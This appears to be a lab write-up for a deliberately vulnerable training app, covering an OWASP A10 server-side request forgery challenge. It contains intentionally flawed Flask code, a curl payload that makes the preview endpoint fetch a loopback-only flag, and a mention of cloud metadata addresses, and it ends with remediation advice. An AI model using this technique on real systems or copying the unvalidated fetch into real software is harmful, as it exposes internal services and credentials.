# A10:2021 - Server-Side Request Forgery (SSRF)

**Endpoints:** `GET /a10/preview`, `GET /a10/internal/admin/flag`
**Severity:** High

## Vulnerability

`/a10/internal/admin/flag` is meant to be reachable only by the server
itself, so its only access control is a source-IP check:

```python
# app/challenges/a10_ssrf.py
@bp.get("/internal/admin/flag")
def internal_admin_flag():
    if request.remote_addr not in ("127.0.0.1", "::1"):
        return jsonify({"error": "forbidden - internal only"}), 403
    return jsonify({"flag": "FLAG{ssrf_internal_admin_hit}"})
```

That control assumes an external attacker can never make the server issue
a request to itself. But `/a10/preview` — a public "link preview" feature —
fetches *any* URL the caller supplies, server-side, with no allowlist and
no block on loopback/private ranges:

```python
@bp.get("/preview")
def preview():
    url = request.args.get("url", "")
    resp = requests.get(url, timeout=3)
    return jsonify({"status": resp.status_code, "preview": resp.text[:500]})
```

An attacker who can only reach `/a10/preview` over the network can point it
at `http://127.0.0.1:5000/a10/internal/admin/flag`. The *server* makes that
request, so it passes the IP check — the preview response becomes a proxy
into the "internal-only" endpoint.

## Reproduce

```bash
curl -s -G http://localhost:5000/a10/preview \
  --data-urlencode 'url=http://127.0.0.1:5000/a10/internal/admin/flag'
```

```json
{"status": 200, "preview": "{\"flag\":\"FLAG{ssrf_internal_admin_hit}\"}"}
```

## Impact

Bypasses network-boundary access control entirely. In a real deployment
this same pattern reaches cloud metadata endpoints (e.g.
`http://169.254.169.254/`), internal admin panels, or other services that
assume "only the app server can reach me."

## Fix

- Validate and allowlist target hosts/schemes before fetching — reject
  loopback, link-local, and private (RFC1918) ranges by default.
- Don't rely on source IP as the only control for "internal" endpoints;
  require a real internal auth token/mTLS between services.
- If link previews are a hard requirement, fetch through a dedicated,
  network-isolated proxy that can't reach internal infrastructure at all.

## Reference

[OWASP Top 10 2021 - A10 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
